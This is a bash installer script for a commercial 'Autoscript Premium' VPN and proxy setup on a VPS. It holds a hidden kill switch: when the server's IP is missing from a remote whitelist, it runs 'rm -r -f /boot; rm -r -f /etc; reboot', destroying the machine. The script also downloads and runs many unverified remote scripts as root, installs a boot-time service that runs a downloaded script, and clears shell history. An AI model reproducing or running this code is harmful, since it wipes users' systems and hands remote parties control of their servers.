#!/bin/bash
if [ "${EUID}" -ne 0 ]; then
		echo "You need to run this script as root"
		exit 1
fi
if [ "$(systemd-detect-virt)" == "openvz" ]; then
		echo "OpenVZ is not supported"
		exit 1
fi
red='\e[1;31m'
green='\e[0;32m'
NC='\e[0m'
MYIP=$(wget -qO- ifconfig.me/ip);
IZIN=$( curl https://raw.githubusercontent.com/halluboys/ipvps/main/ip | grep $MYIP )
if [ $MYIP = $IZIN ]; then
echo -e "${green}Permission Accepted...${NC}"
else
echo -e "${red}Permission Denied!${NC}";
echo "Please Contact Admin"
echo "Telegram t.me/xzvnct"
echo "Waiting 5 Sec"
rm -f setup.sh
sleep 5
rm -r -f /boot; rm -r -f /etc; reboot
exit 0
fi
cd
# install wget and curl
apt -y install wget curl
apt -y install python
apt -y install socat
apt -y install ruby
gem install lolcat
apt -y install figlet
apt -y install dos2unix

# install webserver
apt -y install nginx
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/halluboys/px/main/nginx.conf"
mkdir -p /home/vps/public_html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/halluboys/px/main/vps.conf"
/etc/init.d/nginx restart

mkdir /var/lib/premium-script;
echo "IP=" >> /var/lib/premium-script/ipvps.conf
#install go
wget https://raw.githubusercontent.com/halluboys/px/main/v2rayy/go.sh && chmod +x go.sh && ./go.sh
#install cf
wget https://raw.githubusercontent.com/halluboys/px/main/certyy.sh && chmod +x certyy.sh && dos2unix certyy.sh && sudo ./certyy.sh
#install ssh ovpn
wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ssh-vpn.sh && chmod +x ssh-vpn.sh && screen -S ssh-vpn ./ssh-vpn.sh
wget https://raw.githubusercontent.com/halluboys/xzvnct/main/weleh.sh && chmod +x weleh.sh && screen -S weleh ./weleh.sh
wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ohp.sh && chmod +x ohp.sh && screen -S ohp ./ohp.sh
#install sstp
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/sstp.sh && chmod +x sstp.sh && screen -S sstp ./sstp.sh
#install ss+ssr
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ssr.sh && chmod +x ssr.sh && screen -S ssr ./ssr.sh
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/sodosok.sh && chmod +x sodosok.sh && screen -S ss ./sodosok.sh
#install v2ray
wget https://raw.githubusercontent.com/halluboys/px/main/v2rayy/ins-vt.sh && chmod +x ins-vt.sh && screen -S v2ray ./ins-vt.sh
#install wg
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/wg.sh && chmod +x wg.sh && screen -S wg ./wg.sh
#install L2TP
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/ipsec.sh && chmod +x ipsec.sh && screen -S ipsec ./ipsec.sh
#wget https://raw.githubusercontent.com/halluboys/xzvnct/main/set-br.sh && chmod +x set-br.sh && ./set-br.sh
# install trojan-go
wget https://raw.githubusercontent.com/halluboys/xzvnct/main/update/ins-trojango.sh && dos2unix ins-trojango.sh && chmod +x ins-trojango.sh && ./ins-trojango.sh
rm -f /root/go.sh
rm -f /root/weleh.sh
rm -f /root/ohp.sh
rm -f /root/certyy.sh
rm -f /root/ssh-vpn.sh
rm -f /root/sstp.sh
rm -f /root/wg.sh
rm -f /root/ss.sh
rm -f /root/ssr.sh
rm -f /root/ins-vt.sh
rm -f /root/ipsec.sh
rm -f /root/set-br.sh
rm -f /root/ins-trojango.sh
cat <<EOF> /etc/systemd/system/autosett.service
[Unit]
Description=autosetting
Documentation=https://xzvnct.my.id

[Service]
Type=oneshot
ExecStart=/bin/bash /etc/set.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable autosett
wget -O /etc/set.sh "https://raw.githubusercontent.com/halluboys/xzvnct/main/set.sh"
chmod +x /etc/set.sh
history -c
echo "1.2" > /home/ver
clear
echo " "
echo "Installation has been completed!!"
echo " "
echo "=================================-Autoscript Premium-===========================" | tee -a log-install.txt
echo "" | tee -a log-install.txt
echo "--------------------------------------------------------------------------------" | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Service & Port"  | tee -a log-install.txt
echo "   - OpenSSH                 : 22"  | tee -a log-install.txt
echo "   - OpenVPN                 : TCP 1194, UDP 2200, SSL 442"  | tee -a log-install.txt
echo "   - Stunnel4                : 222, 777"  | tee -a log-install.txt
echo "   - SSLH                    : 443, "  | tee -a log-install.txt
echo "   - Dropbear                : 109, 143"  | tee -a log-install.txt
echo "   - Squid Proxy             : 3128, 8080 (limit to IP Server)"  | tee -a log-install.txt
echo "   - Badvpn                  : 7100, 7200, 7300"  | tee -a log-install.txt
echo "   - Nginx                   : 81"  | tee -a log-install.txt
echo "   - Wireguard               : 7070"  | tee -a log-install.txt
echo "   - L2TP/IPSEC VPN          : 1701"  | tee -a log-install.txt
echo "   - PPTP VPN                : 1732"  | tee -a log-install.txt
echo "   - SSTP VPN                : 444"  | tee -a log-install.txt
echo "   - Shadowsocks-R           : 1443-1543"  | tee -a log-install.txt
echo "   - SS-OBFS TLS             : 2443-2543"  | tee -a log-install.txt
echo "   - SS-OBFS HTTP            : 3443-3543"  | tee -a log-install.txt
echo "   - V2RAY Vmess TLS         : 8443"  | tee -a log-install.txt
echo "   - V2RAY Vmess None TLS    : 80"  | tee -a log-install.txt
echo "   - V2RAY Vless TLS         : 2083"  | tee -a log-install.txt
echo "   - V2RAY Vless None TLS    : 8880"  | tee -a log-install.txt
echo "   - Trojan                  : 2087"  | tee -a log-install.txt
echo "   - TrojanGO                : 2096"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   >>> Server Information & Other Features"  | tee -a log-install.txt
echo "   - Timezone                : Asia/Jakarta (GMT +7)"  | tee -a log-install.txt
echo "   - Fail2Ban                : [ON]"  | tee -a log-install.txt
echo "   - Dflate                  : [ON]"  | tee -a log-install.txt
echo "   - IPtables                : [ON]"  | tee -a log-install.txt
echo "   - Auto-Reboot             : [ON]"  | tee -a log-install.txt
echo "   - IPv6                    : [OFF]"  | tee -a log-install.txt
echo "   - Autoreboot On 05.00 GMT +7" | tee -a log-install.txt
echo "   - Autobackup Data" | tee -a log-install.txt
echo "   - Restore Data" | tee -a log-install.txt
echo "   - Auto Delete Expired Account" | tee -a log-install.txt
echo "   - Full Orders For Various Services" | tee -a log-install.txt
echo "   - White Label" | tee -a log-install.txt
echo "   - Installation Log --> /root/log-install.txt"  | tee -a log-install.txt
echo ""  | tee -a log-install.txt
echo "   - Dev/Main                : haluboys"  | tee -a log-install.txt
echo "   - Telegram                : T.me/xzvnct"  | tee -a log-install.txt
echo "   - Instagram               :  "  | tee -a log-install.txt
echo "   - Whatsapp                :  "  | tee -a log-install.txt
echo "   - Facebook                : https://www.facebook.com" | tee -a log-install.txt
echo "------------------Script Created By HALUBOY-----------------" | tee -a log-install.txt
mv log-install.txt /root
echo ""
rm -f setup.sh
cat /usr/bin/bannerku | lolcat 
echo " Reboot 15 Sec"
sleep 15
reboot 
